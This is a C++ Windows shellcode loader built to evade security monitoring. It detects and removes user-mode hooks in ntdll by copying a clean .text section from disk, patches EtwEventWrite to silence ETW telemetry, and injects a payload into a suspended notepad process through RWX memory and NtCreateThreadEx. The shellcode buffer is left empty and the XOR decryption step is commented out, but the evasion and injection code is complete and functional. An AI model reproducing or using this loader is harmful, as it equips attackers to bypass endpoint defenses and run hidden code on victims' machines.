#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <psapi.h>
#include <cstdlib>
#include <TlHelp32.h>
#include <dbghelp.h>
using namespace std;

#define _CRT_SECURE_NO_WARNINGS


// Detect first bytes of Nt address
// Stolen from https://github.com/TheD1rkMtr
BOOL isItHooked(LPVOID addr) {
	BYTE stub[] = "\x4c\x8b\xd1\xb8";
	std::string charData = (char*)addr;

	if (memcmp(addr, stub, 4) != 0) {
		printf("\t[!] First bytes are HOOKED : ");
		for (int i = 0; i < 4; i++) {
			BYTE currentByte = charData[i];
			printf("\\x%02x", currentByte);
		}
		printf(" (different from ");
		for (int i = 0; i < 4; i++) {
			printf("\\x%02x", stub[i]);
		}
		printf(")\n");
		return TRUE;
	}
	return FALSE;
}




int main()
{


	// Copy ntdll to a fresh memory alloc and overwrite calls adresses
	// Stolen from https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++
	printf("[+] Detecting ntdll hooking\n");
	int nbHooks = 0;
	if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory"))) {
		printf("\t[!] NtAllocateVirtualMemory is Hooked\n");
		nbHooks++;
	}
	else {
		printf("\t[+] NtAllocateVirtualMemory Not Hooked\n");
	}
	if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory"))) {
		printf("\t[!] NtProtectVirtualMemory is Hooked\n");
		nbHooks++;
	}
	else {
		printf("\t[+] NtProtectVirtualMemory Not Hooked\n");
	}
	if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx"))) {
		printf("\t[!] NtCreateThreadEx is Hooked\n");
		nbHooks++;
	}
	else {
		printf("\t[+] NtCreateThreadEx Not Hooked\n");
	}
	if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationThread"))) {
		printf("\t[!] NtQueryInformationThread Hooked\n");
		nbHooks++;
	}
	else {
		printf("\t[+] NtQueryInformationThread Not Hooked\n");
	}
	if (nbHooks > 0) {
		char path[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','n','t','d','l','l','.','d','l','l',0 };
		char sntdll[] = { '.','t','e','x','t',0 };
		HANDLE process = GetCurrentProcess();
		MODULEINFO mi = {};
		HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
		GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
		LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
		HANDLE ntdllFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
		LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);
		PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
		PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);
		for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
			PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
			if (!strcmp((char*)hookedSectionHeader->Name, (char*)sntdll)) {
				DWORD oldProtection = 0;
				bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
				memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
				isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
			}
		}
		printf("\n[+] Detecting hooks in new ntdll module\n");

		if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory"))) {
			printf("\t[!] NtAllocateVirtualMemory Hooked\n");
		}
		else {
			printf("\t[+] NtAllocateVirtualMemory Not Hooked\n");
		}

		if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory"))) {
			printf("\t[!] NtProtectVirtualMemory Hooked\n");
		}
		else {
			printf("\t[+] NtProtectVirtualMemory Not Hooked\n");
		}
		if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx"))) {
			printf("\t[!] NtCreateThreadEx is Hooked\n");
			nbHooks++;
		}
		else {
			printf("\t[+] NtCreateThreadEx Not Hooked\n");
		}
		if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationThread"))) {
			printf("\t[!] NtQueryInformationThread Hooked\n");
		}
		else {
			printf("\t[+] NtQueryInformationThread Not Hooked\n");
		}
	}







	// Redefine Nt functions
	typedef LPVOID(NTAPI* uNtAllocateVirtualMemory)(HANDLE, PVOID, ULONG, SIZE_T, ULONG, ULONG);
	typedef NTSTATUS(NTAPI* uNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
	typedef NTSTATUS(NTAPI* uNtCreateThreadEx) (OUT PHANDLE hThread, IN ACCESS_MASK DesiredAccess, IN PVOID ObjectAttributes, IN HANDLE ProcessHandle, IN PVOID lpStartAddress, IN PVOID lpParameter, IN ULONG Flags, IN SIZE_T StackZeroBits, IN SIZE_T SizeOfStackCommit, IN SIZE_T SizeOfStackReserve, OUT PVOID lpBytesBuffer);
	typedef NTSTATUS(NTAPI* uNtProtectVirtualMemory) (HANDLE, IN OUT PVOID*, IN OUT PSIZE_T, IN ULONG, OUT PULONG);
	typedef NTSTATUS(NTAPI* uNtQueryInformationThread) (IN HANDLE          ThreadHandle, IN THREADINFOCLASS ThreadInformationClass, OUT PVOID          ThreadInformation, IN ULONG           ThreadInformationLength, OUT PULONG         ReturnLength);

	HINSTANCE hNtdll = GetModuleHandleA("ntdll.dll");
	uNtAllocateVirtualMemory NtAllocateVirtualMemory = (uNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	uNtWriteVirtualMemory NtWriteVirtualMemory = (uNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	uNtProtectVirtualMemory NtProtectVirtualMemory = (uNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
	uNtCreateThreadEx NtCreateThreadEx = (uNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
	uNtQueryInformationThread NtQueryInformationThread = (uNtQueryInformationThread)GetProcAddress(hNtdll, "NtQueryInformationThread");











	// PATCH ETW : Stolen from https://github.com/Hagrid29/RemotePatcher/blob/main/RemotePatcher/RemotePatcher.cpp
	printf("\n[+] Patching ETW writer\n");
	void* etwAddr = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
	char etwPatch[] = { 0xC3 };
	DWORD lpflOldProtect = 0;
	unsigned __int64 memPage = 0x1000;
	void* etwAddr_bk = etwAddr;
	NtProtectVirtualMemory(GetCurrentProcess(), (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
	NtWriteVirtualMemory(GetCurrentProcess(), (LPVOID)etwAddr, (PVOID)etwPatch, sizeof(etwPatch), (PULONG)nullptr);
	NtProtectVirtualMemory(GetCurrentProcess(), (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
	printf("[+] ETW patched !\n");















	printf("\n[+] Decrypting payload in memory\n");
	/*std::string BhWMYCCwFVXerVIAIRxdmOk = "prout";
	char trigger_that[] = "xored shellcode here";
	int j = 0;
	for (int i = 0; i < sizeof trigger_that; i++) {
		if (j == BhWMYCCwFVXerVIAIRxdmOk.size() - 1) j = 0;
		trigger_that[i] = trigger_that[i] ^ BhWMYCCwFVXerVIAIRxdmOk[j];
		j++;
	}*/


	// simple popup
	unsigned char NqQlPkEKGs[] = "";


	LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
	PROCESS_INFORMATION pi = { 0 };
	CreateProcessA(0, (LPSTR)"C:\\Windows\\System32\\notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, pStartupInfo, &pi);

	ULONG dwSize = sizeof NqQlPkEKGs;
	HANDLE hHostThread = INVALID_HANDLE_VALUE;
	DWORD OldProtect = 0;
	printf("[+] Allocating memory in unhooked process\n");
	PVOID NTAlloc = VirtualAllocEx(pi.hProcess, NULL, sizeof NqQlPkEKGs, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

	printf("[+] Writing payload into memory\n");
	SIZE_T* nbBytes = 0;
	if (!WriteProcessMemory(pi.hProcess, NTAlloc, NqQlPkEKGs, sizeof NqQlPkEKGs, nbBytes)) {
		printf("\n\t[!] WriteProcessMemory() failed with status %u\n", GetLastError());
		return 1;
	}

	printf("[+] Unleashing the beast !!\n");
	HANDLE remoteThreadHandle;
	NTSTATUS NTCreateThread = NtCreateThreadEx(&remoteThreadHandle, 0x1FFFFF, NULL, pi.hProcess, NTAlloc, NULL, FALSE, NULL, NULL, NULL, NULL);
	if (!NT_SUCCESS(NTCreateThread)) {
		printf("\n\t[!] Error while executing payload in unhooked process : (%u)\n", GetLastError());
		return 1;
	}


	// Want to resume legitimate process ?
	//ResumeThread(pi.hThread);



}